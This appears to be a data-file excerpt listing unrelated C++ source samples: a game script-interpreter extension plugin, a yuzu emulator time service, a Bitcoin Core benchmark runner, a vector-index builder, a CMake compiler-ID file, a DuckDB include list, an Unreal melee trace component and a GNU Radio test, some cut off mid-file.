currentScript->CollectParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void StoreParams(int32_t count) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->StoreParameters(&currentScript->m_nIp, count);\n    }\n\n    static __declspec(dllexport) void UpdateCompareFlag(uint8_t flag) {\n#pragma comment(linker, \"/EXPORT:\" __FUNCTION__\"=\" __FUNCDNAME__)\n\n        if (currentScript)\n            currentScript->UpdateCompareFlag(flag);\n    }\n\n    static int8_t ProcessOneCommand(CRunningScript* script) {\n        ++CTheScripts::CommandsExecuted;\n\n        int32_t m_nPrevIp = script->m_nIp;\n        int32_t command = CTheScripts::ScriptSpace[script->m_nIp + 1] << 8 | CTheScripts::ScriptSpace[script->m_nIp];\n        script->m_nIp += sizeof(uint16_t);\n        script->m_bNotFlag = (command & 0x8000);\n        command &= 0x7FFF;\n\n        auto f = mapOfNewOpcodes.find(command);\n        if (f != mapOfNewOpcodes.end()) {\n            currentScript = script;\n            tScriptParam* params = CTheScripts::ScriptParams;\n            return f->second((int32_t*)params);\n        }\n\n        script->m_nIp = m_nPrevIp;\n        --CTheScripts::CommandsExecuted;\n\n        return script->ProcessOneCommand();\n    }\n\n    ScmExtender() {\n        plugin::Events::initRwEvent += []() {\n            CTheScripts::ScriptSpace = plugin::patch::Get<uint8_t*>(0x4387A0 + 3);\n        };\n\n        auto processScriptHook = [](CRunningScript* script, void*) {\n            if (script->m_bUseMissionCleanup)\n                script->DoDeathArrestCheck();\n\n            if (script->m_bIsMission && CTheScripts::FailCurrentMission == 1 && script->m_nSP == 1)\n                script->m_nIp = script->m_anStack[--script->m_nSP];\n\n            if (CTimer::m_snTimeInMilliseconds >= script->m_nWakeTime) {\n                while (!ProcessOneCommand(script)) {\n                }\n            }\n\n            if (!script->m_bAwake)\n                return;\n\n            if (!(CPad::GetPad(0)->NewState.ButtonCross && !CPad::GetPad(0)->OldState.ButtonCross))\n                return;\n\n            script->m_nWakeTime = 0;\n\n            for (int i = 0; i < 6; i++) {\n                if (CMessages::BIGMessages[i].m_Stack[0].m_pText != nullptr)\n                    CMessages::BIGMessages[i].m_Stack[0].m_nStartTime = 0;\n            }\n\n            if (CMessages::BriefMessages[0].m_pText != nullptr)\n                CMessages::BriefMessages[0].m_nStartTime = 0;\n        };\n        plugin::patch::RedirectCall(0x4393DF, LAMBDA(void, __fastcall, processScriptHook, CRunningScript*, void*));\n    }\n} scmExtender;\n",
    "// SPDX-FileCopyrightText: Copyright 2023 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include \"common/scope_exit.h\"\n#include \"core/core.h\"\n#include \"core/core_timing.h\"\n#include \"core/hle/kernel/k_shared_memory.h\"\n#include \"core/hle/service/cmif_serialization.h\"\n#include \"core/hle/service/psc/time/clocks/ephemeral_network_system_clock_core.h\"\n#include \"core/hle/service/psc/time/clocks/standard_local_system_clock_core.h\"\n#include \"core/hle/service/psc/time/clocks/standard_network_system_clock_core.h\"\n#include \"core/hle/service/psc/time/clocks/standard_user_system_clock_core.h\"\n#include \"core/hle/service/psc/time/manager.h\"\n#include \"core/hle/service/psc/time/shared_memory.h\"\n#include \"core/hle/service/psc/time/static.h\"\n#include \"core/hle/service/psc/time/steady_clock.h\"\n#include \"core/hle/service/psc/time/system_clock.h\"\n#include \"core/hle/service/psc/time/time_zone.h\"\n#include \"core/hle/service/psc/time/time_zone_service.h\"\n\nnamespace Service::PSC::Time {\nnamespace {\nconstexpr Result GetTimeFromTimePointAndContext(s64* out_time, SteadyClockTimePoint& time_point,\n                                                SystemClockContext& context) {\n    R_UNLESS(out_time != nullptr, ResultInvalidArgument);\n    R_UNLESS(time_point.IdMatches(context.steady_time_point), ResultClockMismatch);\n\n    *out_time = context.offset + time_point.time_point;\n    R_SUCCEED();\n}\n} // namespace\n\nStaticService::StaticService(Core::System& system_, StaticServiceSetupInfo setup_info,\n                             std::shared_ptr<TimeManager> time, const char* name)\n    : ServiceFramework{system_, name}, m_system{system}, m_setup_info{setup_info}, m_time{time},\n      m_local_system_clock{m_time->m_standard_local_system_clock},\n      m_user_system_clock{m_time->m_standard_user_system_clock},\n      m_network_system_clock{m_time->m_standard_network_system_clock},\n      m_time_zone{m_time->m_time_zone},\n      m_ephemeral_network_clock{m_time->m_ephemeral_network_clock}, m_shared_memory{\n                                                                        m_time->m_shared_memory} {\n    // clang-format off\n        static const FunctionInfo functions[] = {\n            {0,   D<&StaticService::GetStandardUserSystemClock>, \"GetStandardUserSystemClock\"},\n            {1,   D<&StaticService::GetStandardNetworkSystemClock>, \"GetStandardNetworkSystemClock\"},\n            {2,   D<&StaticService::GetStandardSteadyClock>, \"GetStandardSteadyClock\"},\n            {3,   D<&StaticService::GetTimeZoneService>, \"GetTimeZoneService\"},\n            {4,   D<&StaticService::GetStandardLocalSystemClock>, \"GetStandardLocalSystemClock\"},\n            {5,   D<&StaticService::GetEphemeralNetworkSystemClock>, \"GetEphemeralNetworkSystemClock\"},\n            {20,  D<&StaticService::GetSharedMemoryNativeHandle>, \"GetSharedMemoryNativeHandle\"},\n            {50,  D<&StaticService::SetStandardSteadyClockInternalOffset>, \"SetStandardSteadyClockInternalOffset\"},\n            {51,  D<&StaticService::GetStandardSteadyClockRtcValue>, \"GetStandardSteadyClockRtcValue\"},\n            {100, D<&StaticService::IsStandardUserSystemClockAutomaticCorrectionEnabled>, \"IsStandardUserSystemClockAutomaticCorrectionEnabled\"},\n            {101, D<&StaticService::SetStandardUserSystemClockAutomaticCorrectionEnabled>, \"SetStandardUserSystemClockAutomaticCorrectionEnabled\"},\n            {102, D<&StaticService::GetStandardUserSystemClockInitialYear>, \"GetStandardUserSystemClockInitialYear\"},\n            {200, D<&StaticService::IsStandardNetworkSystemClockAccuracySufficient>, \"IsStandardNetworkSystemClockAccuracySufficient\"},\n            {201, D<&StaticService::GetStandardUserSystemClockAutomaticCorrectionUpdatedTime>, \"GetStandardUserSystemClockAutomaticCorrectionUpdatedTime\"},\n            {300, D<&StaticService::CalculateMonotonicSystemClockBaseTimePoint>, \"CalculateMonotonicSystemClockBaseTimePoint\"},\n            {400, D<&StaticService::GetClockSnapshot>, \"GetClockSnapshot\"},\n            {401, D<&StaticService::GetClockSnapshotFromSystemClockContext>, \"GetClockSnapshotFromSystemClockContext\"},\n            {500, D<&StaticService::CalculateStandardUserSystemClockDifferenceByUser>, \"CalculateStandardUserSystemClockDifferenceByUser\"},\n            {501, D<&StaticService::CalculateSpanBetween>, \"CalculateSpanBetween\"},\n        };\n    // clang-format on\n\n    RegisterHandlers(functions);\n}\n\nResult StaticService::GetStandardUserSystemClock(OutInterface<SystemClock> out_service) {\n    LOG_DEBUG(Service_Time, \"called.\");\n\n    *out_service = std::make_shared<SystemClock>(m_system, m_user_system_clock,\n                                                 m_setup_info.can_write_user_clock,\n                                                 m_setup_info.can_write_uninitialized_clock);\n    R_SUCCEED();\n}\n\nResult StaticService::GetStandardNetworkSystemClock(OutInterface<SystemClock> out_service) {\n    LOG_DEBUG(Service_Time, \"called.\");\n\n    *out_service = std::make_shared<SystemClock>(m_system, m_ne",
    "// Copyright (c) 2015 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <bench/bench.h>\n#include <bench/perf.h>\n\n#include <assert.h>\n#include <iostream>\n#include <iomanip>\n\nbenchmark::BenchRunner::BenchmarkMap &benchmark::BenchRunner::benchmarks() {\n    static std::map<std::string, benchmark::BenchFunction> benchmarks_map;\n    return benchmarks_map;\n}\n\nbenchmark::BenchRunner::BenchRunner(std::string name, benchmark::BenchFunction func)\n{\n    benchmarks().insert(std::make_pair(name, func));\n}\n\nvoid\nbenchmark::BenchRunner::RunAll(benchmark::duration elapsedTimeForOne)\n{\n    perf_init();\n    if (std::ratio_less_equal<benchmark::clock::period, std::micro>::value) {\n        std::cerr << \"WARNING: Clock precision is worse than microsecond - benchmarks may be less accurate!\\n\";\n    }\n    std::cout << \"#Benchmark\" << \",\" << \"count\" << \",\" << \"min(ns)\" << \",\" << \"max(ns)\" << \",\" << \"average(ns)\" << \",\"\n              << \"min_cycles\" << \",\" << \"max_cycles\" << \",\" << \"average_cycles\" << \"\\n\";\n\n    for (const auto &p: benchmarks()) {\n        State state(p.first, elapsedTimeForOne);\n        p.second(state);\n    }\n    perf_fini();\n}\n\nbool benchmark::State::KeepRunning()\n{\n    if (count & countMask) {\n      ++count;\n      return true;\n    }\n    time_point now;\n\n    uint64_t nowCycles;\n    if (count == 0) {\n        lastTime = beginTime = now = clock::now();\n        lastCycles = beginCycles = nowCycles = perf_cpucycles();\n    }\n    else {\n        now = clock::now();\n        auto elapsed = now - lastTime;\n        auto elapsedOne = elapsed / (countMask + 1);\n        if (elapsedOne < minTime) minTime = elapsedOne;\n        if (elapsedOne > maxTime) maxTime = elapsedOne;\n\n        // We only use relative values, so don't have to handle 64-bit wrap-around specially\n        nowCycles = perf_cpucycles();\n        uint64_t elapsedOneCycles = (nowCycles - lastCycles) / (countMask + 1);\n        if (elapsedOneCycles < minCycles) minCycles = elapsedOneCycles;\n        if (elapsedOneCycles > maxCycles) maxCycles = elapsedOneCycles;\n\n        if (elapsed*128 < maxElapsed) {\n          // If the execution was much too fast (1/128th of maxElapsed), increase the count mask by 8x and restart timing.\n          // The restart avoids including the overhead of this code in the measurement.\n          countMask = ((countMask<<3)|7) & ((1LL<<60)-1);\n          count = 0;\n          minTime = duration::max();\n          maxTime = duration::zero();\n          minCycles = std::numeric_limits<uint64_t>::max();\n          maxCycles = std::numeric_limits<uint64_t>::min();\n          return true;\n        }\n        if (elapsed*16 < maxElapsed) {\n          uint64_t newCountMask = ((countMask<<1)|1) & ((1LL<<60)-1);\n          if ((count & newCountMask)==0) {\n              countMask = newCountMask;\n          }\n        }\n    }\n    lastTime = now;\n    lastCycles = nowCycles;\n    ++count;\n\n    if (now - beginTime < maxElapsed) return true; // Keep going\n\n    --count;\n\n    assert(count != 0 && \"count == 0 => (now == 0 && beginTime == 0) => return above\");\n\n    // Output results\n    // Duration casts are only necessary here because hardware with sub-nanosecond clocks\n    // will lose precision.\n    int64_t min_elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(minTime).count();\n    int64_t max_elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>(maxTime).count();\n    int64_t avg_elapsed = std::chrono::duration_cast<std::chrono::nanoseconds>((now-beginTime)/count).count();\n    int64_t averageCycles = (nowCycles-beginCycles)/count;\n    std::cout << std::fixed << std::setprecision(15) << name << \",\" << count << \",\" << min_elapsed << \",\" << max_elapsed << \",\" << avg_elapsed << \",\"\n              << minCycles << \",\" << maxCycles << \",\" << averageCycles << \"\\n\";\n    std::cout.copyfmt(std::ios(nullptr));\n\n    return false;\n}\n",
    "//\n// Copyright (c) 2024 Meng Chen. All rights reserved.\n//\n\n#include \"index_bipartite.h\"\n\n#include <omp.h>\n#include <tsl/robin_map.h>\n#include <tsl/robin_set.h>\n\n#include <bitset>\n#include <boost/dynamic_bitset.hpp>\n#include <chrono>\n#include <ctime>\n#include <random>\n#include <atomic>\n#include <utility>\n\n#include \"efanna2e/exceptions.h\"\n#include \"efanna2e/parameters.h\"\n\n// define likely unlikely\n#define likely(x) __builtin_expect(!!(x), 1)\n#define unlikely(x) __builtin_expect(!!(x), 0)\n\n#define PROJECTION_SLACK 2\n\nnamespace efanna2e {\n\nIndexBipartite::IndexBipartite(const size_t dimension, const size_t n, Metric m, Index *initializer)\n    : Index(dimension, n, m), initializer_{initializer}, total_pts_const_(n) {\n    bipartite_ = true;\n    l2_distance_ = new DistanceL2();\n    width_ = 1;\n    if (m == efanna2e::COSINE) {\n        need_normalize = true;\n    }\n}\n\nIndexBipartite::~IndexBipartite() {}\n\nvoid IndexBipartite::BuildBipartite(size_t n_sq, const float *sq_data, size_t n_bp, const float *bp_data,\n                                    const Parameters &parameters) {\n   std::cout << \"start build bipartite index\" << std::endl;\n    auto s = std::chrono::high_resolution_clock::now();\n    uint32_t M_sq = parameters.Get<uint32_t>(\"M_sq\");\n    uint32_t M_bp = parameters.Get<uint32_t>(\"M_bp\");\n    uint32_t M_pjbp = parameters.Get<uint32_t>(\"M_pjbp\");\n    // uint32_t L_pq = parameters.Get<uint32_t>(\"L_pq\");\n    // aligned and processed memory block for tow datasets\n    data_bp_ = bp_data;\n    data_sq_ = sq_data;\n    nd_ = n_bp;\n    nd_sq_ = n_sq;\n    total_pts_ = nd_ + nd_sq_;\n    u32_nd_ = static_cast<uint32_t>(nd_);\n    u32_nd_sq_ = static_cast<uint32_t>(nd_sq_);\n    u32_total_pts_ = static_cast<uint32_t>(total_pts_);\n    locks_ = std::vector<std::mutex>(total_pts_);\n\n    SetBipartiteParameters(parameters);\n    // InitBipartiteGraph();\n    for (size_t i = 0; i < bipartite_graph_.size(); ++i) {\n        if (i < nd_) {\n            bipartite_graph_[i].reserve(((size_t)M_bp) * 1.5);\n        } else {\n            bipartite_graph_[i].reserve(((size_t)M_sq) * 1.5);\n        }\n    }\n\n    if (need_normalize) {\n        std::cout << \"normalizing base data\" << std::endl;\n        for (size_t i = 0; i < nd_; ++i) {\n            float *data = const_cast<float *>(data_bp_);\n            normalize(data + i * dimension_, dimension_);\n        }\n    }\n\n    float bipartite_degree_avg = 0;\n    size_t bipartite_degree_max = 0, bipartite_degree_min = std::numeric_limits<size_t>::max();\n    float projection_degree_avg = 0;\n    size_t projection_degree_max = 0, projection_degree_min = std::numeric_limits<size_t>::max();\n\n    size_t i = 0;\n\n\n    supply_nbrs_.resize(nd_);\n\n    // project bipartite\n    BipartiteProjectionReserveSpace(parameters);\n\n    CalculateProjectionep();\n\n    assert(projection_ep_ < nd_);\n    // std::cout << \"begin link projection\" << std::endl;\n\n    qbaseNNbipartite(parameters);\n    std::cout << std::endl;\n\n    // e = std::chrono::high_resolution_clock::now();\n    auto e = std::chrono::high_resolution_clock::now();\n    auto diff = e - s;\n    std::cout << \"Build projection graph time: \" << diff.count() / (1000 * 1000 * 1000) << std::endl;\n\n    for (i = 0; i < projection_graph_.size(); ++i) {\n        std::vector<uint32_t> &nbrs = projection_graph_[i];\n        projection_degree_avg += static_cast<float>(nbrs.size());\n        projection_degree_max = std::max(projection_degree_max, nbrs.size());\n        projection_degree_min = std::min(projection_degree_min, nbrs.size());\n    }\n    std::cout << \"total degree: \" << projection_degree_avg << std::endl;\n    std::cout << \"Projection degree avg: \" << projection_degree_avg / (float)u32_nd_ << std::endl;\n    std::cout << \"Projection degree max: \" << projection_degree_max << std::endl;\n    std::cout << \"Projection degree min: \" << projection_degree_min << std::endl;\n\n    // statistics of bipartite_graph_\n    float max_degree_nd = 0, min_degree_nd = std::numeric_limits<float>::max(), avg_degree_nd = 0;\n    float max_degree_nd_sq = 0, min_degree_nd_sq = std::numeric_limits<float>::max(), avg_degree_nd_sq = 0;\n    for (size_t i = 0; i < bipartite_graph_.size(); ++i) {\n        auto &nbrs = bipartite_graph_[i];\n        if (i < nd_) {\n            max_degree_nd = std::max(max_degree_nd, static_cast<float>(nbrs.size()));\n            min_degree_nd = std::min(min_degree_nd, static_cast<float>(nbrs.size()));\n            avg_degree_nd += static_cast<float>(nbrs.size());\n        } else {\n            max_degree_nd_sq = std::max(max_degree_nd_sq, static_cast<float>(nbrs.size()));\n            min_degree_nd_sq = std::min(min_degree_nd_sq, static_cast<float>(nbrs.size()));\n            avg_degree_nd_sq += static_cast<float>(nbrs.size());\n        }\n    }\n\n    std::cout << \"Bipartite nd degree avg: \" << avg_degree_nd / nd_ << std::endl;\n    std::cout << \"Bipartite nd degree max: \" << max_degree_nd << std::endl;\n    std::cout << \"Bipartite nd degree min: \" << min_degree_nd << std::endl;\n\n    std::cout << \"Bi",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include \"src/parser/parsed_data/alter_info.cpp\"\n\n#include \"src/parser/parsed_data/alter_scalar_function_info.cpp\"\n\n#include \"src/parser/parsed_data/alter_table_function_info.cpp\"\n\n#include \"src/parser/parsed_data/alter_table_info.cpp\"\n\n#include \"src/parser/parsed_data/attach_info.cpp\"\n\n#include \"src/parser/parsed_data/comment_on_column_info.cpp\"\n\n#include \"src/parser/parsed_data/create_info.cpp\"\n\n#include \"src/parser/parsed_data/create_index_info.cpp\"\n\n#include \"src/parser/parsed_data/create_aggregate_function_info.cpp\"\n\n#include \"src/parser/parsed_data/create_collation_info.cpp\"\n\n#include \"src/parser/parsed_data/create_copy_function_info.cpp\"\n\n#include \"src/parser/parsed_data/create_macro_info.cpp\"\n\n#include \"src/parser/parsed_data/create_pragma_function_info.cpp\"\n\n#include \"src/parser/parsed_data/create_secret_info.cpp\"\n\n#include \"src/parser/parsed_data/create_sequence_info.cpp\"\n\n#include \"src/parser/parsed_data/create_scalar_function_info.cpp\"\n\n#include \"src/parser/parsed_data/create_table_function_info.cpp\"\n\n#include \"src/parser/parsed_data/create_table_info.cpp\"\n\n#include \"src/parser/parsed_data/create_type_info.cpp\"\n\n#include \"src/parser/parsed_data/create_view_info.cpp\"\n\n#include \"src/parser/parsed_data/detach_info.cpp\"\n\n#include \"src/parser/parsed_data/drop_info.cpp\"\n\n#include \"src/parser/parsed_data/extra_drop_info.cpp\"\n\n#include \"src/parser/parsed_data/sample_options.cpp\"\n\n#include \"src/parser/parsed_data/transaction_info.cpp\"\n\n#include \"src/parser/parsed_data/vacuum_info.cpp\"\n\n",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"Combat/Components/MeleeWeaponTraceComponent.h\"\n#include \"Kismet/KismetSystemLibrary.h\"\n#include \"Logs/RapidLog.h\"\n\nstatic int32 GDisplayAttackHitDetectionDebug = 0;\nstatic FAutoConsoleVariableRef CVarDisplayMeleeWeaponTraceDebug(\n\tTEXT(\"Rapid.DisplayMeleeWeaponTraceDebug\"),\n\tGDisplayAttackHitDetectionDebug,\n\tTEXT(\"Display debug traces for melee attack hit detection (0 - disabled. 1 - enabled)\"),\n\tECVF_Cheat);\n\nUMeleeWeaponTraceComponent::UMeleeWeaponTraceComponent()\n{\n\tPrimaryComponentTick.bCanEverTick = true;\n}\n\nvoid UMeleeWeaponTraceComponent::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tif (AActor* Owner = GetOwner())\n\t{\n\t\tAddActorToIgnore(Owner);\n\n\t\tCollisionMeshComponent = Owner->GetComponentByClass<USkeletalMeshComponent>();\n\t}\n}\n\nvoid UMeleeWeaponTraceComponent::TickComponent(float DeltaTime, ELevelTick TickType,\n                                               FActorComponentTickFunction* ThisTickFunction)\n{\n\tSuper::TickComponent(DeltaTime, TickType, ThisTickFunction);\n\n\tif (!bIsEnabled) return;\n\n\tCollisionTrace();\n}\n\n\nvoid UMeleeWeaponTraceComponent::EnableCollision()\n{\n\tClearHitActors();\n\n\tbIsEnabled = true;\n}\n\nvoid UMeleeWeaponTraceComponent::DisableCollision()\n{\n\tbIsEnabled = false;\n}\n\nvoid UMeleeWeaponTraceComponent::CollisionTrace()\n{\n\tif (!CollisionMeshComponent)\n\t{\n\t\tUE_LOG(RapidCombatLog, Warning, TEXT(\"Can't find MeshComponent for MeleeWeaponTraceComponent. Owner : %s\"),\n\t\t       *GetOwner()->GetName())\n\t}\n\n\tconst FVector StartLocation = CollisionMeshComponent->GetSocketLocation(StartSocketName);\n\tconst FVector EndLocation = CollisionMeshComponent->GetSocketLocation(EndSocketName);\n\n\tTArray<TEnumAsByte<EObjectTypeQuery>> ObjectTypes;\n\tObjectTypes.Add(UEngineTypes::ConvertToObjectType(ECC_Pawn));\n\n\tTArray<FHitResult> HitResults;\n\n\tUKismetSystemLibrary::SphereTraceMultiForObjects(GetWorld(), StartLocation, EndLocation, Radius, ObjectTypes, false,\n\t                                                 ActorsToIgnore, GDisplayAttackHitDetectionDebug\n\t\t                                                                 ? EDrawDebugTrace::ForDuration\n\t\t                                                                 : EDrawDebugTrace::None, HitResults, true,\n\t                                                 FColor::Green, FColor::Red, 0.1);\n\tfor (FHitResult HitResult : HitResults)\n\t{\n\t\tLastHitResult = HitResult;\n\n\t\tif (AlreadyHitActors.Contains(HitResult.GetActor()))\n\t\t\tcontinue;\n\n\t\tAlreadyHitActors.Add(HitResult.GetActor());\n\n\t\t//OnActorHit.Broadcast(HitResult);\n\t}\n}\n\nvoid UMeleeWeaponTraceComponent::ClearHitActors()\n{\n\tAlreadyHitActors.Empty();\n}\n\nvoid UMeleeWeaponTraceComponent::AddActorToIgnore(AActor* Actor)\n{\n\tActorsToIgnore.AddUnique(Actor);\n}\n\nvoid UMeleeWeaponTraceComponent::RemoveActorToIgnore(AActor* Actor)\n{\n\tActorsToIgnore.Remove(Actor);\n}\n",
    "#include <fmt/core.h>\n#include <gnuradio-4.0/Graph.hpp>\n#include <gnuradio-4.0/Scheduler.hpp>\n#include <gnuradio-4.0/packet-modem/burst_shaper.hpp>\n#include <gnuradio-4.0/packet-modem/vector_sink.hpp>\n#include <gnuradio-4.0/packet-modem/vector_source.hpp>\n#include <pmtv/pmt.hpp>\n#include <boost/ut.hpp>\n#include <complex>\n#include <numeric>\n\nint main()\n{\n    using namespace boost::ut;\n    using c64 = std::complex<float>;\n\n    gr::Graph fg;\n\n    const std::vector<c64> v(30, { 1.0f, -1.0f });\n    const std::vector<gr::Tag> tags = { { 0, { { \"packet_len\", 10 } } },\n                                        { 10, { { \"packet_len\", 20 } } } };\n    auto& source = fg.emplaceBlock<gr::packet_modem::VectorSource<c64>>(v, false, tags);\n\n    const std::vector<float> leading_shape = { 0.2f, 0.4f, 0.6f, 0.8f, 0.9f };\n    const std::vector<float> trailing_shape = { 0.8f, 0.5f, 0.1f };\n    auto& shaper = fg.emplaceBlock<gr::packet_modem::BurstShaper<c64, c64, float>>(\n        leading_shape, trailing_shape);\n\n    auto& sink = fg.emplaceBlock<gr::packet_modem::VectorSink<c64>>();\n    expect(eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(source).to<\"in\">(shaper)));\n    expect(eq(gr::ConnectionResult::SUCCESS, fg.connect<\"out\">(shaper).to<\"in\">(sink)));\n\n    gr::scheduler::Simple sched{ std::move(fg) };\n    expect(sched.runAndWait().has_value());\n\n    const auto data = sink.data();\n    std::print(\"vector sink contains {} items\\n\", data.size());\n    std::print(\"vector sink items:\\n\");\n    for (const auto n : data) {\n        fmt::print(\"{} \", n);\n    }\n    std::print(\"\\n\");\n    std::print(\"vector sink tags:\\n\");\n    const auto sink_tags = sink.tags();\n    for (const auto& t : sink_tags) {\n        fmt::print(\"index = {}, map = {}\\n\", t.index, t.map);\n    }\n\n    return 0;\n}\n",
